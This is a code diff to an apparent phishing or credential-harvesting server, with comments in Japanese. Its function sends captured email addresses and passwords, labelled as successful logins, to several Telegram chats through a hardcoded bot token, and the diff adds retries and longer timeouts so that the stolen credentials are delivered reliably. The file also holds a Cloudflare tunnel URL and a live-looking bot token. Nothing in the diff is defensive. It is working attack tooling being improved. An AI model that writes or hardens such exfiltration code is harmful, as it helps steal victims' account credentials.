@@ -32,7 +32,7 @@ DB_PATH = os.getenv('DB_PATH', 'data/alldatabase.json')
 
 # テレグラム設定
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8314466263:AAG_eAJkU6j8SNFfJsodij9hkkdpSPARc6o')
-TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8129922775,8303180774,8243562591').split(',')
+TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8303180774,8243562591').split(',')
 
 # 🔥 PC側のCloudflare URL（環境変数から取得、なければデフォルト値）
 CLOUDFLARE_URL = os.getenv('CLOUDFLARE_URL', 'https://config-surname-carroll-incoming.trycloudflare.com').rstrip('/')
@@ -279,22 +279,51 @@ def get_all_active_sessions():
 # ========================================
 
 def send_telegram_notification(email, password):
-    """テレグラムにログイン成功通知を送信"""
+    """テレグラムにログイン成功通知を送信（リトライ機能付き）"""
     message = f"◎ログイン成功\nメールアドレス：{email}\nパスワード：{password}"
     
     log_with_timestamp("TELEGRAM", f"通知送信開始 | Email: {email}")
     
     for chat_id in TELEGRAM_CHAT_IDS:
-        try:
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            payload = {
-                'chat_id': chat_id,
-                'text': message
-            }
-            requests.post(url, json=payload, timeout=5)
-            log_with_timestamp("TELEGRAM", f"送信完了: Chat {chat_id}")
-        except Exception as e:
-            log_with_timestamp("ERROR", f"Telegram通知失敗 (Chat: {chat_id}) | Error: {str(e)}")
+        success = False
+        max_retries = 3
+        
+        for attempt in range(max_retries):
+            try:
+                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                payload = {
+                    'chat_id': chat_id,
+                    'text': message
+                }
+                
+                log_with_timestamp("TELEGRAM", f"送信試行 {attempt + 1}/{max_retries} | Chat: {chat_id}")
+                
+                response = requests.post(url, json=payload, timeout=30)
+                
+                if response.status_code == 200:
+                    log_with_timestamp("TELEGRAM", f"✓ 送信完了: Chat {chat_id}")
+                    success = True
+                    break
+                else:
+                    log_with_timestamp("ERROR", f"Telegram API エラー | Chat: {chat_id} | Status: {response.status_code} | Response: {response.text}")
+                    
+            except requests.exceptions.Timeout:
+                log_with_timestamp("ERROR", f"Telegram タイムアウト (試行 {attempt + 1}/{max_retries}) | Chat: {chat_id}")
+                if attempt < max_retries - 1:
+                    time.sleep(2)
+                    
+            except requests.exceptions.ConnectionError as e:
+                log_with_timestamp("ERROR", f"Telegram 接続エラー (試行 {attempt + 1}/{max_retries}) | Chat: {chat_id} | Error: {str(e)}")
+                if attempt < max_retries - 1:
+                    time.sleep(2)
+                    
+            except Exception as e:
+                log_with_timestamp("ERROR", f"Telegram 予期しないエラー (試行 {attempt + 1}/{max_retries}) | Chat: {chat_id} | Error: {str(e)}")
+                if attempt < max_retries - 1:
+                    time.sleep(2)
+        
+        if not success:
+            log_with_timestamp("ERROR", f"✗ Telegram通知失敗（全試行失敗） | Chat: {chat_id}")
 
 def send_telegram_notification_error(message):
     """エラー通知をテレグラムに送信（重複防止あり）"""
